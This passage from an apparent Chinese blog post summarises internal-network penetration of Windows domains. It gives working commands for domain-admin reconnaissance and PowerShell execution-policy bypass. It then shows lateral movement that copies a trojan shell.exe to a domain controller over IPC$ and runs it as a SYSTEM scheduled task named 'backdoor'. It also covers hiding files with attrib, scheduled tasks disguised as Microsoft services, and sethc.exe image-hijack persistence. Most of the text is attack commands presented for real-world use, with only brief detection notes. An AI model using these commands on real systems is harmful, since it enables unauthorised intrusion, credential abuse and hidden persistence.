<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">nltest <span class="hljs-string">/DCLIST</span>:域名<br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/010.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Domain</span> Controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/011.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netdom query pdc</span><br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/012.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">nslookup -<span class="hljs-built_in">type</span>=SRV \<span class="hljs-variable">_LDAP</span>.\<span class="hljs-variable">_tcp</span><br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/013.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">



<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/014.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p> <strong>获取域内用户和管理员：</strong><br>   查询所有域用户列表：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span><br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/015.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic useraccount <span class="hljs-keyword">get</span> /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/016.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">dsquery <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/017.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net localgroup administrators /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/018.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
<p> <strong>查询域管理员用户组:</strong></p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> admins<span class="hljs-string">&quot; /domain:</span><br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/019.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Enterprise</span> Admains<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>

<p><strong>定位域管理员:</strong><br>   推荐三个工具</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PsLoggedon<span class="hljs-selector-class">.exe</span><br><br>AdFind<span class="hljs-selector-class">.exe</span>  <br><br>PVEFindADUser<span class="hljs-selector-class">.exe</span> -current<br></code></pre></td></tr></table></figure>

   <img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/020.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p> <strong>查找域管理进程：</strong><br>   本机检查：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /<span class="hljs-built_in">domain</span>    <span class="hljs-comment">//获取域管理员列表</span><br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/021.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/v</span>       <span class="hljs-string">//</span>  列出本机所有进程及进程用户<br></code></pre></td></tr></table></figure>

<p>然后寻找是否有进程所有者为域管理员的进程。</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/022.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
<p> <strong>查询域控制器的域用户会话：</strong></p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /<span class="hljs-built_in">domain</span>  <span class="hljs-comment">// 收集域控制器的列表</span><br><br>net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /<span class="hljs-built_in">domain</span>   <span class="hljs-comment">// 收集域管理员列表</span><br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/023.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>使用 Netsess.exe 查询每个域控制器，收集所有活动域会话的列表，将域管理员列表与活动会话列表交叉引用，以确定哪些 IP 地址具有活动域令牌：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Netsess<span class="hljs-selector-class">.exe</span> -h<br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/024.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p> <strong>扫描远程系统上运行的任务：</strong><br>前提是目标使用了本地域管理员共享账户</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">FOR /F <span class="hljs-title function_">%i</span> <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">DO</span> @echo [+] <span class="hljs-title function_">%i</span> <span class="hljs-variable">&amp;&amp;</span> @tasklist /V /S <span class="hljs-title function_">%i</span> /U user /P password 2&gt;NUL &gt; <span class="hljs-keyword">output</span>.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-title function_">%n</span> <span class="hljs-keyword">in</span> (names.txt) <span class="hljs-keyword">DO</span> @type <span class="hljs-keyword">output</span>.txt | findstr <span class="hljs-title function_">%n</span> &gt; NUL <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-title function_">%n</span> was found running a process <span class="hljs-keyword">on</span> <span class="hljs-title function_">%i</span> <span class="hljs-variable">&amp;&amp;</span> pause<br></code></pre></td></tr></table></figure>

<p> <strong>扫描远程系统上 NetBIOS 信息：</strong></p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F <span class="hljs-title function_">%i</span> <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> @echo [+] Checking <span class="hljs-title function_">%i</span> <span class="hljs-variable">&amp;&amp;</span> nbtstat -A <span class="hljs-title function_">%i</span> 2&gt;NUL &gt;nbsessions.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-title function_">%n</span> <span class="hljs-keyword">in</span> (admins.txt) <span class="hljs-keyword">DO</span> @type nbsessions.txt | findstr /I <span class="hljs-title function_">%n</span> &gt; NUL <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-title function_">%n</span> was found logged <span class="hljs-keyword">into</span> <span class="hljs-title function_">%i</span><br></code></pre></td></tr></table></figure>

<p> <strong>利用 PowerShell 收集域内信息：</strong><br>PowerShell 常用的执行权限共有四种。</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Restricted</span>：默认设置，不允许执行任何脚本。<br><span class="hljs-variable">Allsigned</span>：只能运行经过证书验证的脚本。<br><span class="hljs-variable">Unrestricted</span>：权限最高，可以执行任意脚本。<br><span class="hljs-variable">RemoteSigned</span>：本地脚本无限制，但是对来自网络的脚本必须经过签名。<br></code></pre></td></tr></table></figure>

<p>在 PowerShell 中输入 “Get-ExecutionPolicy”，看到为默认Restricted 权限，如果想执行一个 PowerShell 脚本，需要修改 PowerShell 的默认权限为执行权限。</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Executionpolicy <span class="hljs-comment">Unrestricted</span><br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/025.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><strong>PowerView 集成在 PowerSploit 工具包中:</strong><br>下载地址为</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></p>
<p>PowerView 中的常用命令</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">Get</span>-NetDomain    <span class="hljs-comment">// 获取当前用户所在的域名称。</span><br><span class="hljs-built_in">Get</span>-NetUser    <span class="hljs-comment">// 返回所有用户的详细信息。</span><br><span class="hljs-built_in">Get</span>-NetDomainController    <span class="hljs-comment">// 获取所有域控制器。</span><br><span class="hljs-built_in">Get</span>-NetComputer    <span class="hljs-comment">// 获取所有域内机器的详细信息。</span><br><span class="hljs-built_in">Get</span>-NetOU    <span class="hljs-comment">// 获取域中的 OU 信息。</span><br><span class="hljs-built_in">Get</span>-NetGroup    <span class="hljs-comment">// 获取所有域内组和组成员信息。</span><br><span class="hljs-built_in">Get</span>-NetFileServer    <span class="hljs-comment">// 根据 SPN 获取当前域使用的文件服务器。</span><br><span class="hljs-built_in">Get</span>-NetShare    <span class="hljs-comment">// 获取当前域内所有网络共享。</span><br><span class="hljs-built_in">Get</span>-NetSession    <span class="hljs-comment">// 获取在指定服务器存在的会话信息。</span><br><span class="hljs-built_in">Get</span>-NetRDPSession    <span class="hljs-comment">// 获取在指定服务器存在的远程连接信息。</span><br><span class="hljs-built_in">Get</span>-NetProcess    <span class="hljs-comment">// 获取远程主机的进程信息。</span><br><span class="hljs-built_in">Get</span>-UserEvent    <span class="hljs-comment">// 获取指定用户的日志信息。</span><br><span class="hljs-built_in">Get</span>-ADObject    <span class="hljs-comment">// 获取活动目录的对象信息。</span><br><span class="hljs-built_in">Get</span>-NetGPO    <span class="hljs-comment">// 获取域所有组策略对象。</span><br><span class="hljs-built_in">Get</span>-DomainPolicy    <span class="hljs-comment">// 获取域默认或域控制器策略。</span><br>Invoke-UserHunter    <span class="hljs-comment">// 用于获取域用户登录计算机及该用户是否有本地管理权限。</span><br>Invoke-ProcessHunter    <span class="hljs-comment">// 查找域内所有机器进程用于找到某特定用户。</span><br>Invoke-UserEventHunter    <span class="hljs-comment">// 根据用户日志获取某域用户</span><br></code></pre></td></tr></table></figure>

<h6 id="如果在实战中目标-powershell-的权限是不允许执行任意脚本，那么可以用-exec-bypass-来进行绕过"><a href="#如果在实战中目标-powershell-的权限是不允许执行任意脚本，那么可以用-exec-bypass-来进行绕过" class="headerlink" title="如果在实战中目标 powershell 的权限是不允许执行任意脚本，那么可以用 -exec bypass  来进行绕过"></a>如果在实战中目标 powershell 的权限是不允许执行任意脚本，那么可以用 -exec bypass  来进行绕过</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">&quot;import-module c:\powerview.ps1;get-netuser&quot;</span><br></code></pre></td></tr></table></figure>



<ol>
<li><h6 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a><strong>获取权限</strong></h6><strong>权限的划分：</strong><br>1)system账户</li>
</ol>
<p>Windows系统最高级别的权限是System用户权限，有一些操作需要System权限才能完成，比如修改注册表核心键值、强制结束恶意应用程序进程等。</p>
<p>2)管理员账户</p>
<p>具有最高的管理和使用权限，能改变系统所有设置，可以安装和删除程序，能访问计算机上所有的文件。除此之外，它还拥有控制其他用户的权限。</p>
<p>3)普通用户账户</p>
<p>某些功能的使用，是受到一定限制的账户，在系统中可以创建多个此类账户，也可以改变其账户类型。该账户可以访问已经安装在计算机上的程序，可以设置自己账户的图片、密码等，但无权更改大多数计算机的设置。<br>案例演示：<br>上传后门文件后我们拿到一台webshell权限：</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/026.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>systeminfo查看补丁信息：</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/027.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/%E6%8A%8A%E8%A1%A5%E4%B8%81%E6%94%BE%E5%88%B0%E8%BF%99%E9%87%8C%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%9C%AA%E4%BF%AE%E8%A1%A5%E7%9A%84%E6%BC%8F%E6%B4%9E">https://i.hacking8.com/tiquan/</a></p>
<p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/%E6%8A%8A%E8%A1%A5%E4%B8%81%E6%94%BE%E5%88%B0%E8%BF%99%E9%87%8C%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%9C%AA%E4%BF%AE%E8%A1%A5%E7%9A%84%E6%BC%8F%E6%B4%9E">把补丁放到这里看一下未修补的漏洞</a></p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/028.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/029.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>根据指定exp进行提权操作。</p>
<p>Windows提权漏洞集合：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<p>Linux提权漏洞集合：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
<h6 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a><strong>横向移动</strong></h6><p>​	在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8&spm=1001.2101.3001.7020">域控制器</a>的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。</p>
<p> <strong>利用Windows远程连接命令进行横向渗透：</strong></p>
<p>​		在渗透测试中，拿到目标机器的用户明文密码或者NTLM Hash后，可以用Windows自带的方法对远程目标系统进行命令行下的连接操作，连接远程主机并执行相关命令，也可以通过PTH的方法，将散列值或明文密码传递到目标机器中进行验证<strong>。</strong></p>
<p> <strong>建立IPC连接:</strong><br>    IPC$(Internet Process Connection) 是NT2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个连接。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</p>
<p>​	通过ipc$,可以与目标及其建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。</p>
<p>​	通过执行以下命令，我们可以让win7和DC建立IPC连接<br><code>	</code></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\&lt;DC的IP&gt;\ipc$ <span class="hljs-string">&quot;password&quot;</span> /user:<span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\10.20.5.107\ipc$ <span class="hljs-string">&quot;qwer1234&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> <span class="hljs-comment">//查看当前主机所建立的连接</span><br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/030.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">


<p>我们列出DC上C盘的目录:</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dir</span> \\<span class="hljs-number">10.20.5.107</span>\c$<br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/031.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>再如将文件复制到目标主机DC的C盘上面去: (在实战中，我们可以将木马程序复制到目标主机上去)</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">copy</span> C:\Users\douser\Desktop\<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span> \\<span class="hljs-number">10.20</span>.<span class="hljs-number">5.107</span>\<span class="hljs-keyword">c</span>$<br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/032.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>接着使用at命令创建计划任务，让目标主机在指定的时间运行木马程序(从Win8开始不再支持at命令)：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">10.20.5.107</span> <span class="hljs-number">18</span>:<span class="hljs-number">53</span>:<span class="hljs-number">00</span> c:\shell.exe<br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/033.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
<p> <strong>利用 schtasks 命令:</strong><br>利用schtasks命令创建计划任务进行横向移动的操作流程如下:</p>
<ol>
<li><p>先与目标主机建立ipc连接。 </p>
</li>
<li><p>然后使用copy命令远程操作，将metasploit生成的payload文件shell.exe复制到目标系统C盘中。 </p>
</li>
<li><p>在目标主机DC上创建一个名称为”backdoor”的计划任务。 该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe,启动权限为system。命令如下: schtasks &#x2F;create &#x2F;s 10.20.5.107 &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\loader.exe &#x2F;ru system &#x2F;f </p>
<p>4.然后执行如下命令立即运行该计划任务(也可以自己等一分钟): schtasks &#x2F;run &#x2F;s 110.20.5.107 &#x2F;i &#x2F;tn backdoor &#x2F;&#x2F; i: 忽略任何限制立即运行任务 schtasks &#x2F;run &#x2F;s 10.20.5.107 &#x2F;i &#x2F;tn backdoor &#x2F;u Administrator &#x2F;p qwer1234 &#x2F;&#x2F;遇到上面所说的报错时执行加上&#x2F;u和&#x2F;p参数分别设置高权限用户名和密码 </p>
<p>5.计划任务成功运行后，执行如下命令强制删除该计划任务: schtasks &#x2F;delete &#x2F;s 192.168.183.130 &#x2F;tn “backdoor” &#x2F;f</p>
</li>
</ol>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/034.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>​	遇到这种情况，我们可以加上&#x2F;u和&#x2F;p参数分别设置高权限用户名和密码，如下: 这样就行了:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s 10.20.5.107 /u Administrator /p qwer1234 /tn backdoor /sc minute /mo 1 /tr c:\loader.exe /ru system /f<br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/035.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/036.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/037.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>成功上线炫彩蛇。</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/038.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p> 利用Impacket网络协议工具包：<br> Impacket网络协议工具包：<br><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br> Impacket网络协议工具包介绍：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p>
<p>还有很多种横向方法，这里就不一一举例了。</p>
<h6 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a><strong>权限维持</strong></h6><p>​	攻击者尝试维持驻点的技术，包括攻击者用来在重启、修改凭据或者其他能够切断攻击者访问的情况下，依然保持对系统的访问，具体技术包括一些访问某些页面、执行某些操作或者修改配置使得可以在系统上维持驻点，比如替换或劫持合法的代码或添加启动代码，也就是后门。<br> 后门功能：</p>
<ul>
<li><p>达成目的（必要）</p>
<ul>
<li>写入文件</li>
<li>回连cc</li>
<li>挖矿</li>
<li>记录密码</li>
<li>执行命令</li>
</ul>
</li>
<li><p>隐藏与保护过程（二选一）</p>
<ul>
<li>文件隐藏</li>
<li>进程隐藏</li>
<li>网络隐藏</li>
<li>守护进程</li>
<li>系统权限启动</li>
</ul>
</li>
<li><p>重复达成目的（二选一）</p>
<ul>
<li>定期触发</li>
<li>重启触发</li>
<li>常见事件&#x2F;操作触发</li>
</ul>
<p>后门分类：</p>
</li>
<li><p>按层级分类</p>
<ul>
<li>系统内核级后门：rootkit</li>
<li>系统用户级后门：dll劫持</li>
<li>中间件后门：webshell、中间件库文件后门</li>
<li>应用软件后门：ssh后门、notepad++扩展</li>
</ul>
</li>
<li><p>按功能&#x2F;启动方式分类</p>
<ul>
<li>web后门：webshell</li>
<li>自启动后门：计划任务、开机启动项</li>
<li>守护进程后门：守护进程保护恶意进程</li>
<li>服务进程后门：svchost服务<br>.*.<strong>这里例举五个Windows权限维持</strong><br>所有后门需要落地的文件，都没有做免杀。实战情况下，需要对后门文件进行免杀。此外，可以通过命令：</li>
</ul>
</li>
</ul>
<p>attrib +s +a +h +r cs.exe # 给文件设置系统文件属性、存档文件属性、隐藏文件属性、只读文件属性</p>
<p>例如：attrib +h +s C:\Windows\Temp\evil.exe 		隐藏evil文件</p>
<h3 id="1）计划任务："><a href="#1）计划任务：" class="headerlink" title="1）计划任务："></a>1）计划任务：</h3><p>(1) 原理：windows可以通过计划任务功能定期执行操作。可以在定期执行的任务中写入恶意操作，打到维持权限的目的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /ru system /tn <span class="hljs-string">&quot;Microsoft\Windows\Multimedia\SystemMediaService&quot;</span> /sc ONSTART /tr <span class="hljs-string">&quot;C:\cs.exe&quot;</span> <span class="hljs-comment"># 创建一个名为Microsoft\Windows\Multimedia\SystemMediaService，开机时执行C:\cs.exe的计划任务，需要管理员权限</span><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /change /tn <span class="hljs-string">&quot;Microsoft\Windows\Multimedia\SystemSoundsService&quot;</span> /ru system /tr <span class="hljs-string">&quot;C:\cs.exe&quot;</span> /enable <span class="hljs-comment"># 修改Microsoft\Windows\Multimedia\SystemSoundsService计划任务，需要管理员权限，更改任务无法通过/sc、/mo参数更改计划频率</span><br></code></pre></td></tr></table></figure>

<p>(2) 检测： 查看计划任务程序库中是否存在异常计划任务。</p>
<p>(3) 清除： 删除异常计划任务及对应文件。</p>
<h3 id="2）映像劫持："><a href="#2）映像劫持：" class="headerlink" title="2）映像劫持："></a>2）映像劫持：</h3><p>(1) 原理：映像劫持也被成为”IFEO”(Image File Execution Options)，当目标程序被映像劫持时，双击目标程序，系统会转而运行劫持程序，并不会运行目标程序。许多病毒会利用这一点来抑制杀毒软的运行，并运行自己的程序。</p>
<p>造成映像劫持的罪魁祸首就是参数”Debugger”，它是IFEO中第一个被处理的参数。系统如果发现某个程序文件在IFEO列表中，就会首先来读取Debugger参数。如果该参数不为空，系统则会把Debugger参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。</p>
<p>参数”Debugger”本来是为了让程序员能够通过双击程序文件直接进入调试器里调试自己的程序，早期是为了兼容早期版本，现在却成了病毒的攻击手段。</p>
<p>windows server 2008 r2 standard：</p>
<p>在注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options项下添加sethc.exe项，在该项下添加debugger键，值为要执行的程序。这里添加c:\windows\system32\cmd.exe</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v debugger /t REG\_SZ /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure>

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/039.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/040.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>win 10：</p>
<p>亲测亦可，但是需要管理员权限运行cmd后再执行添加命令。</p>
